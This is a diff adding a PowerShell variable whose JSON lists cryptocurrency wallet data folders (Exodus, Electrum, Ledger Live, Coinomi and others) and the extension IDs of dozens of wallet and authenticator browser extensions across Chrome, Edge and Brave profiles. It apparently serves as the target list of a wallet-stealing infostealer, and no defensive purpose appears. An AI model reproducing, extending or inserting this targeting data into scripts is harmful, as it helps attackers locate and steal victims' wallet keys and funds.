@@ -1,0 +1,294 @@
+$pathdata =
+@'
+[
+    {
+        "root": "%appdata%",
+        "targets": [
+            {
+                "name": "Exodus-A",
+                "path": "Exodus"
+            },
+            {
+                "name": "Atomic-A",
+                "path": "Atomic Wallet"
+            },
+            {
+                "name": "Electrum-A",
+                "path": "Electrum"
+            },
+            {
+                "name": "Ledger-A",
+                "path": "Ledger Live"
+            },
+            {
+                "name": "Jaxx-A",
+                "path": "Jaxx Liberty"
+            },
+            {
+                "name": "com.liberty.jaxx-A",
+                "path": "com.liberty.jaxx"
+            },
+            {
+                "name": "Guarda-A",
+                "path": "Guarda"
+            },
+            {
+                "name": "Armory-A",
+                "path": "Armory"
+            },
+            {
+                "name": "DELTA-A",
+                "path": "DELTA"
+            },
+            {
+                "name": "TREZOR-A",
+                "path": "TREZOR Bridge"
+            },
+            {
+                "name": "Bitcoin-A",
+                "path": "Bitcoin"
+            },
+            {
+                "name": "binance-A",
+                "path": "binance"
+            },
+            {
+                "name": "mexc-A",
+                "path": "mexc"
+            }
+        ]
+    },
+    {
+        "root": "%localappdata%",
+        "targets": [
+            {
+                "name": "Blockstream-A",
+                "path": "Blockstream Green"
+            },
+            {
+                "name": "Coinomi-A",
+                "path": "Coinomi"
+            }
+        ]
+    },
+    {
+        "root": "%localappdata%\\Google\\Chrome\\User Data\\Default\\Extensions",
+        "targets": [
+            {
+                "name": "Metamask-C",
+                "path": "nkbihfbeogaeaoehlefnkodbefgpgknn"
+            },
+            {
+                "name": "MEWcx-C",
+                "path": "nlbmnnijcnlegkjjpcfjclmcfggfefdm"
+            },
+            {
+                "name": "Coin98-C",
+                "path": "aeachknmefphepccionboohckonoeemg"
+            },
+            {
+                "name": "Binance-C",
+                "path": "fhbohimaelbohpjbbldcngcnapndodjp"
+            },
+            {
+                "name": "Jaxx-C",
+                "path": "cjelfplplebdjjenllpjcblmjkfcffne"
+            },
+            {
+                "name": "Coinbase-C",
+                "path": "hnfanknocfeofbddgcijnmhnfnkdnaad"
+            },
+            {
+                "name": "Ronin-C",
+                "path": "fnjhmkhhmkbjkkabndcnnogagogbneec"
+            },
+            {
+                "name": "Trust-C",
+                "path": "egjidjbpglichdcondbcbdnbeeppgdph"
+            },
+            {
+                "name": "Venom-C",
+                "path": "ojggmchlghnjlapmfbnjholfjkiidbch"
+            },
+            {
+                "name": "Sui-C",
+                "path": "opcgpfmipidbgpenhmajoajpbobppdil"
+            },
+            {
+                "name": "Martian-C",
+                "path": "efbglgofoippbgcjepnhiblaibcnclgk"
+            },
+            {
+                "name": "Tron-C",
+                "path": "ibnejdfjmmkpcnlpebklmnkoeoihofec"
+            },
+            {
+                "name": "Petra-C",
+                "path": "ejjladinnckdgjemekebdpeokbikhfci"
+            },
+            {
+                "name": "Pontem-C",
+                "path": "phkbamefinggmakgklpkljjmgibohnba"
+            },
+            {
+                "name": "Fewcha-C",
+                "path": "ebfidpplhabeedpnhjnobghokpiioolj"
+            },
+            {
+                "name": "Math-C",
+                "path": "afbcbjpbpfadlkmhmclhkeeodmamcflc"
+            },
+            {
+                "name": "Authenticator-C",
+                "path": "bhghoamapcdpbohphigoooaddinpkbai"
+            },
+                        {
+                "name": "ExodusWeb3-C",
+                "path": "aholpfdialjgjfhomihkjbmgjidlcdno"
+            },
+            {
+                "name": "Phantom-C",
+                "path": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
+            },
+            {
+                "name": "Core-C",
+                "path": "agoakfejjabomempkjlepdflaleeobhb"
+            },
+            {
+                "name": "Tokenpocket-C",
+                "path": "mfgccjchihfkkindfppnaooecgfneiii"
+            },
+            {
+                "name": "Safepal-C",
+                "path": "lgmpcpglpngdoalbgeoldeajfclnhafa"
+            },
+            {
+                "name": "Solfare-C",
+                "path": "bhhhlbepdkbapadjdnnojkbgioiodbic"
+            },
+                        {
+                "name": "Kaikas-C",
+                "path": "jblndlipeogpafnldhgmapagcccfchpi"
+            },
+                        {
+                "name": "iWallet-C",
+                "path": "kncchdigobghenbbaddojjnnaogfppfj"
+            },
+                        {
+                "name": "Yoroi-C",
+                "path": "ffnbelfdoeiohenkjibnmadjiehjhajb"
+            },
+                        {
+                "name": "Guarda-C",
+                "path": "hpglfhgfnhbgpjdenjgmdgoeiappafln"
+            },
+                        {
+                "name": "Wombat-C",
+                "path": "amkmjjmmflddogmhpjloimipbofnfjih"
+            },
+                        {
+                "name": "Oxygen-C",
+                "path": "fhilaheimglignddkjgofkcbgekhenbh"
+            },
+                        {
+                "name": "Guild-C",
+                "path": "nanjmdknhkinifnkgdcggcfnhdaammmj"
+            },
+                        {
+                "name": "Saturn-C",
+                "path": "nkddgncdjgjfcddamfgcmfnlhccnimig"
+            },
+                        {
+                "name": "Terra-C",
+                "path": "aiifbnbfobpmeekipheeijimdpnlpgpp"
+            },
+                        {
+                "name": "Harmony-C",
+                "path": "fnnegphlobjdpkhecapkijjdkgcjhkib"
+            },
+                        {
+                "name": "Kardia-C",
+                "path": "cgeeodpfagjceefieflmdfphplkenlfk"
+            },
+                        {
+                "name": "Pali-C",
+                "path": "mgffkfbidihjpoaomajlbgchddlicgpn"
+            },
+                        {
+                "name": "BoltX-C",
+                "path": "aodkkagnadcbobfpggfnjeongemjbjca"
+            },
+                        {
+                "name": "Liquality-C",
+                "path": "kpfopkelmapcoipemfendmdcghnegimn"
+            },
+                        {
+                "name": "XDEFI-C",
+                "path": "hmeobnfnfcmdkdcmlblgagmfpfboieaf"
+            },
+                        {
+                "name": "Nami-C",
+                "path": "lpfcbjknijpeeillifnkikgncikgfhdo"
+            },
+                        {
+                "name": "MaiarDEFI-C",
+                "path": "dngmlblcodfobpdpecaadgfbcggfjfnm"
+            },
+                        {
+                "name": "TempleTezos-C",
+                "path": "ookjlbkiijinhpmnjffcofjonbfbgaoc"
+            },
+                        {
+                "name": "XMRpt-C",
+                "path": "eigblbgjknlfbajkfhopmcojidlgcehm"
+             }
+        ]
+    },
+    {
+        "root": "%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Extensions",
+        "targets": [
+            {
+                "name": "Metamask-E",
+                "path": "ejbalbakoplchlghecdalmeeeajnimhm"
+            },
+                        {
+                "name": "Metamask-EE",
+                "path": "nkbihfbeogaeaoehlefnkodbefgpgknn"
+            },
+            {
+                "name": "Coinomi-E",
+                "path": "gmcoclageakkbkbbflppkbpjcbkcfedg"
+            }
+        ]
+    },
+    {
+        "root": "%localappdata%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions",
+        "targets": [
+            {
+                "name": "Metamask-B",
+                "path": "nkbihfbeogaeaoehlefnkodbefgpgknn"
+            },
+            {
+                "name": "MEWcx-B",
+                "path": "nlbmnnijcnlegkjjpcfjclmcfggfefdm"
+            },
+            {
+                "name": "Coin98-B",
+                "path": "aeachknmefphepccionboohckonoeemg"
+            },
+            {
+                "name": "Binance-B",
+                "path": "fhbohimaelbohpjbbldcngcnapndodjp"
+            },
+            {
+                "name": "Jaxx-B",
+                "path": "cjelfplplebdjjenllpjcblmjkfcffne"
+            },
+            {
+                "name": "Coinbase-B",
+                "path": "hnfanknocfeofbddgcijnmhnfnkdnaad"
+            }
+        ]
+    }
+]
+'@;
